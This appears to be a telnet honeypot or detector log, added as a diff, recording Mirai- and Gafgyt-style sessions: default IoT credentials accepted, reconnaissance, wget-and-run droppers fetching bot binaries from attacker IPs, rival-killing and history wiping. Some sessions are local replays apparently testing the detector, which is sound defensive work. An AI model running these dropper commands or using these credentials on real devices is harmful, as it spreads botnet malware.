@@ -1,0 +1,86 @@
+[2026-11-15 18:17:39] [INFO] [96m[+][0m Connection established from [1m185.156.73.12:49152[0m (Session: 8a178f53)
+[2026-11-15 18:17:39] [INFO] [91m[*][0m Auth [185.156.73.12] [1mroot:123456[0m ([91mFAILED[0m) -> Known: [1mXiongmai IP Camera[0m
+[2026-11-15 18:17:39] [INFO] [92m[*][0m Auth [185.156.73.12] [1mroot:xc3511[0m ([92mACCEPTED[0m) -> Known: [1mMirai Default (H.264 DVR)[0m
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`enable`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`system`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`shell`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`sh`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`/bin/busybox cat /proc/mounts`[0m [[93mMEDIUM[0m | Mirai / Bashlite, IoT Botnet Standard]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`cat /proc/cpuinfo`[0m [[93mMEDIUM[0m | Multi-architecture Botnet (Mirai/Qbot)]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`cd /tmp || cd /var/run || cd /dev/shm`[0m
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`wget http://185.156.73.12/bins/mirai.mips -O /tmp/mirai.mips`[0m [[91mCRITICAL[0m | Generic Dropper]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`chmod 777 /tmp/mirai.mips`[0m [[91mHIGH[0m | Generic Dropper]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`/tmp/mirai.mips`[0m
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [185.156.73.12] [1m`exit`[0m
+[2026-11-15 18:17:39] [INFO] [96m[-][0m Connection closed: 185.156.73.12 (Session: 8a178f53, Reason: Attack session ended normally)
+[2026-11-15 18:17:39] [INFO] [96m[+][0m Connection established from [1m45.14.224.18:52104[0m (Session: 68f8ef8b)
+[2026-11-15 18:17:39] [INFO] [92m[*][0m Auth [45.14.224.18] [1madmin:admin[0m ([92mACCEPTED[0m) -> Known: [1mGeneric Router / Switch[0m
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [45.14.224.18] [1m`/bin/busybox ps`[0m [[92mLOW[0m | IoT Botnet Standard]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [45.14.224.18] [1m`killall -9 telnetd`[0m [[91mHIGH[0m | Mirai / Rival Killer]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [45.14.224.18] [1m`cd /tmp; wget http://45.14.224.18/bins/gafgyt.arm -O bot; chmod 777 bot; ./bot`[0m [[91mCRITICAL[0m | Generic Dropper]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [45.14.224.18] [1m`history -c`[0m [[93mMEDIUM[0m | Anti-Forensics]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [45.14.224.18] [1m`exit`[0m
+[2026-11-15 18:17:39] [INFO] [96m[-][0m Connection closed: 45.14.224.18 (Session: 68f8ef8b, Reason: Attack session ended normally)
+[2026-11-15 18:17:39] [INFO] [96m[+][0m Connection established from [1m103.204.180.9:38120[0m (Session: 04e081cc)
+[2026-11-15 18:17:39] [INFO] [91m[*][0m Auth [103.204.180.9] [1mroot:admin[0m ([91mFAILED[0m) -> Known: [1mGeneric IoT Default[0m
+[2026-11-15 18:17:39] [INFO] [92m[*][0m Auth [103.204.180.9] [1mroot:888888[0m ([92mACCEPTED[0m) -> Known: [1mDahua DVR / Camera[0m
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [103.204.180.9] [1m`uname -a`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [103.204.180.9] [1m`ifconfig`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:17:39] [INFO] [95m[CMD][0m [103.204.180.9] [1m`id`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [103.204.180.9] [1m`whoami`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [103.204.180.9] [1m`cat /proc/mounts`[0m [[93mMEDIUM[0m | Mirai / Bashlite]
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [103.204.180.9] [1m`exit`[0m
+[2026-11-15 18:17:40] [INFO] [96m[-][0m Connection closed: 103.204.180.9 (Session: 04e081cc, Reason: Attack session ended normally)
+[2026-11-15 18:17:40] [INFO] [96m[+][0m Connection established from [1m194.26.29.112:60233[0m (Session: 081d086f)
+[2026-11-15 18:17:40] [INFO] [92m[*][0m Auth [194.26.29.112] [1mdefault:oxhlwSG8[0m ([92mACCEPTED[0m) -> Known: [1mMirai (Philips Hue / Embedded)[0m
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [194.26.29.112] [1m`echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00" > /tmp/.trojan`[0m
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [194.26.29.112] [1m`chmod +x /tmp/.trojan`[0m [[91mHIGH[0m | Generic Dropper]
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [194.26.29.112] [1m`/tmp/.trojan`[0m
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [194.26.29.112] [1m`rm -f /tmp/.trojan`[0m
+[2026-11-15 18:17:40] [INFO] [95m[CMD][0m [194.26.29.112] [1m`exit`[0m
+[2026-11-15 18:17:40] [INFO] [96m[-][0m Connection closed: 194.26.29.112 (Session: 081d086f, Reason: Attack session ended normally)
+[2026-11-15 18:36:03] [INFO] [96m[+][0m Connection established from [1m127.0.0.1:11746[0m (Session: 70ba5a3b)
+[2026-11-15 18:36:03] [INFO] [96m[+][0m Connection established from [1m127.0.0.1:11747[0m (Session: 4aca5c8c)
+[2026-11-15 18:36:03] [INFO] [96m[-][0m Connection closed: 127.0.0.1 (Session: 70ba5a3b, Reason: Max auth attempts reached)
+[2026-11-15 18:36:03] [INFO] [92m[*][0m Auth [127.0.0.1] [1mroot:123456[0m ([92mACCEPTED[0m) -> Known: [1mXiongmai IP Camera[0m
+[2026-11-15 18:36:13] [INFO] [95m[CMD][0m [127.0.0.1] [1m`root`[0m
+[2026-11-15 18:36:18] [INFO] [95m[CMD][0m [127.0.0.1] [1m`xc3511`[0m
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`enable`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`system`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`shell`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`sh`[0m [[91mHIGH[0m | Mirai / Gafgyt]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`/bin/busybox cat /proc/mounts`[0m [[93mMEDIUM[0m | IoT Botnet Standard, Mirai / Bashlite]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`cat /proc/cpuinfo`[0m [[93mMEDIUM[0m | Multi-architecture Botnet (Mirai/Qbot)]
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`cd /tmp || cd /var/run || cd /dev/shm`[0m
+[2026-11-15 18:36:19] [INFO] [95m[CMD][0m [127.0.0.1] [1m`wget http://185.156.73.12/bins/mirai.mips -O /tmp/mirai.mips`[0m [[91mCRITICAL[0m | Generic Dropper]
+[2026-11-15 18:36:20] [INFO] [95m[CMD][0m [127.0.0.1] [1m`chmod 777 /tmp/mirai.mips`[0m [[91mHIGH[0m | Generic Dropper]
+[2026-11-15 18:36:20] [INFO] [95m[CMD][0m [127.0.0.1] [1m`/tmp/mirai.mips`[0m
+[2026-11-15 18:36:20] [INFO] [95m[CMD][0m [127.0.0.1] [1m`exit`[0m
+[2026-11-15 18:36:20] [INFO] [96m[-][0m Connection closed: 127.0.0.1 (Session: 4aca5c8c, Reason: Session completed normally)
+[2026-11-15 18:36:20] [INFO] [96m[+][0m Connection established from [1m127.0.0.1:10297[0m (Session: 16be7e40)
+[2026-11-15 18:36:20] [INFO] [92m[*][0m Auth [127.0.0.1] [1madmin:admin[0m ([92mACCEPTED[0m) -> Known: [1mGeneric Router / Switch[0m
+[2026-11-15 18:36:20] [INFO] [95m[CMD][0m [127.0.0.1] [1m`/bin/busybox ps`[0m [[92mLOW[0m | IoT Botnet Standard]
+[2026-11-15 18:36:20] [INFO] [95m[CMD][0m [127.0.0.1] [1m`killall -9 telnetd`[0m [[91mHIGH[0m | Mirai / Rival Killer]
+[2026-11-15 18:36:21] [INFO] [95m[CMD][0m [127.0.0.1] [1m`cd /tmp; wget http://45.14.224.18/bins/gafgyt.arm -O bot; chmod 777 bot; ./bot`[0m [[91mCRITICAL[0m | Generic Dropper]
+[2026-11-15 18:36:21] [INFO] [95m[CMD][0m [127.0.0.1] [1m`history -c`[0m [[93mMEDIUM[0m | Anti-Forensics]
+[2026-11-15 18:36:21] [INFO] [95m[CMD][0m [127.0.0.1] [1m`exit`[0m
+[2026-11-15 18:36:21] [INFO] [96m[-][0m Connection closed: 127.0.0.1 (Session: 16be7e40, Reason: Session completed normally)
+[2026-11-15 18:36:21] [INFO] [96m[+][0m Connection established from [1m127.0.0.1:10299[0m (Session: 84fafca6)
+[2026-11-15 18:36:21] [INFO] [92m[*][0m Auth [127.0.0.1] [1mroot:admin[0m ([92mACCEPTED[0m) -> Known: [1mGeneric IoT Default[0m
+[2026-11-15 18:36:31] [INFO] [95m[CMD][0m [127.0.0.1] [1m`root`[0m
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`888888`[0m
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`uname -a`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`ifconfig`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`id`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`whoami`[0m [[92mLOW[0m | Reconnaissance]
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`cat /proc/mounts`[0m [[93mMEDIUM[0m | Mirai / Bashlite]
+[2026-11-15 18:36:37] [INFO] [95m[CMD][0m [127.0.0.1] [1m`exit`[0m
+[2026-11-15 18:36:37] [INFO] [96m[+][0m Connection established from [1m127.0.0.1:10304[0m (Session: 23e027d4)
+[2026-11-15 18:36:37] [INFO] [96m[-][0m Connection closed: 127.0.0.1 (Session: 84fafca6, Reason: Session completed normally)
+[2026-11-15 18:36:38] [INFO] [92m[*][0m Auth [127.0.0.1] [1mdefault:oxhlwSG8[0m ([92mACCEPTED[0m) -> Known: [1mMirai (Philips Hue / Embedded)[0m
+[2026-11-15 18:36:38] [INFO] [95m[CMD][0m [127.0.0.1] [1m`echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00" > /tmp/.trojan`[0m
+[2026-11-15 18:36:38] [INFO] [95m[CMD][0m [127.0.0.1] [1m`chmod +x /tmp/.trojan`[0m [[91mHIGH[0m | Generic Dropper]
+[2026-11-15 18:36:38] [INFO] [95m[CMD][0m [127.0.0.1] [1m`/tmp/.trojan`[0m
+[2026-11-15 18:36:38] [INFO] [95m[CMD][0m [127.0.0.1] [1m`rm -f /tmp/.trojan`[0m
+[2026-11-15 18:36:38] [INFO] [95m[CMD][0m [127.0.0.1] [1m`exit`[0m
+[2026-11-15 18:36:38] [INFO] [96m[-][0m Connection closed: 127.0.0.1 (Session: 23e027d4, Reason: Session completed normally)
